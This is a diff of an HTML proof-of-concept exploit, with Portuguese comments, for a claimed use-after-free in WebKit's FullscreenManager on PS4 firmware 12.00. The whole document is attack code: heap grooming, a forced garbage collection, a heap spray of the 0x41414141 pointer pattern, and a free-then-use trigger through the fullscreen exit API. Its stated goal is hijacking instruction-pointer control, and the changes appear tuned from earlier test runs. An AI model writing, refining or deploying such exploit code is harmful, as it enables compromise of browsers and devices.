@@ -2,74 +2,79 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 WebKit UAF - RIP Control PoC</title>
+<title>PS4 12.00 WebKit UAF - RIP Control PoC v2</title>
 <style>
     body { background-color: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
     button { padding: 20px; font-size: 18px; font-weight: bold; background-color: #cc0000; color: white; border: none; cursor: pointer; }
+    #log { margin-top: 20px; font-size: 16px; color: #ffcc00; }
 </style>
 </head>
 <body>
 
 <h2>WebKit FullscreenManager UAF (Firmware 12.00)</h2>
-<button onclick="triggerPoC()">Trigger UAF & Hijack VTable</button>
-<p id="log">Aguardando...</p>
+<button onclick="triggerPoC()">Iniciar Exploração (Pressione OPTIONS depois)</button>
+<div id="log">Aguardando início...</div>
 
 <script>
-// Representação em Float64 do valor hexadecimal 0x4141414141414141
-// O WebCore tentará dereferenciar isso como um ponteiro de VTable.
-const POINTER_HIJACK_PATTERN = 2.121995791e-314; 
+const PATTERN = 2.121995791e-314; 
 
 function triggerPoC() {
-    document.getElementById("log").innerText = "Preparando a memória...\nPressione OPTIONS no controle do PS4.";
+    const log = document.getElementById("log");
+    log.innerHTML = "Preparando a memória...<br><b>Pressione OPTIONS agora!</b>";
 
-    let keepAlive = [];
+    let controllers = [];
 
-    // [1] Heap Grooming: Preparamos buracos contíguos no bmalloc
+    // [1] Heap Grooming: Alocação inicial
     for(let i = 0; i < 5000; i++) {
         let arr = new Float64Array(8);
         arr[0] = i;
-        keepAlive.push(arr);
+        controllers.push(arr);
     }
 
-    // [2] Criação do Alvo: Elemento isolado para o Fullscreen
+    // [2] Criação do Alvo do Fullscreen
     let fsTarget = document.createElement("div");
     fsTarget.style.cssText = "position:absolute; top:0; left:0; width:100%; height:100%; background:black;";
+    fsTarget.innerHTML = "<h2 style='color:white; margin-top: 20%;'>Tela Cheia.<br>Aperte OPTIONS.</h2>";
     document.body.appendChild(fsTarget);
 
-    // Entramos em Fullscreen. O FullscreenManager em C++ agora guarda um ponteiro para fsTarget.
     if (fsTarget.webkitRequestFullscreen) {
         fsTarget.webkitRequestFullscreen();
     }
 
     window.onblur = function() {
-        document.getElementById("log").innerText = "Evento onblur disparado. Iniciando corrupção...";
+        log.innerHTML += "<br>Evento onblur disparado. Limpando Heap...";
 
-        // [3] Força a Coleta de Lixo para limpar o Heap
-        keepAlive = null;
+        // [3] Força GC (Libera as alocações iniciais)
+        controllers = null;
         for (let i = 0; i < 20000; i++) {
             new ArrayBuffer(0x10000);
         }
 
-        // [4] O Gatilho do UAF: Removemos o hospedeiro da tela cheia do DOM.
-        // O DOM limpa suas referências, mas o FullscreenManager retém o "dangling pointer".
-        fsTarget.remove(); 
-        
-        // [5] Heap Spray: Substituímos o objeto C++ deletado pelo nosso padrão de ponteiro.
+        // [4] Spray (Gera pressão no Heap ANTES da destruição)
         let spray = [];
-        for(let i = 0; i < 10000; i++) {
+        for(let i = 0; i < 8000; i++) {
             let p = new Float64Array(10);
-            p.fill(POINTER_HIJACK_PATTERN);
+            p.fill(PATTERN);
             spray.push(p);
         }
 
-        // [6] Execução da Falha: Ao tentar sair do modo Fullscreen, o motor WebCore
-        // acessará o ponteiro retido, lerá o nosso 0x41414141 como VTable e tentará executar
-        // o callback de saída. Resultado: Segfault (Controle de RIP/PC).
+        // [5] O Gatilho Crítico (Síncrono)
         setTimeout(() => {
-            if (document.webkitIsFullScreen || document.fullscreenElement) {
-                document.webkitExitFullscreen?.();
+            log.innerHTML += "<br>Engatilhando vulnerabilidade (Free + Use)...";
+            
+            try {
+                // Removemos o alvo (FREE)
+                fsTarget.remove(); 
+                
+                // Imediatamente forçamos a API de Fullscreen a interagir com o ponteiro recém-deletado (USE)
+                if (document.webkitIsFullScreen || document.fullscreenElement) {
+                    document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
+                }
+            } catch(e) {
+                console.log("[Erro no Gatilho]", e);
             }
-        }, 1500);
+            
+        }, 3000); // 3 segundos foi o tempo ideal no seu teste de sucesso
     };
 }
 </script>
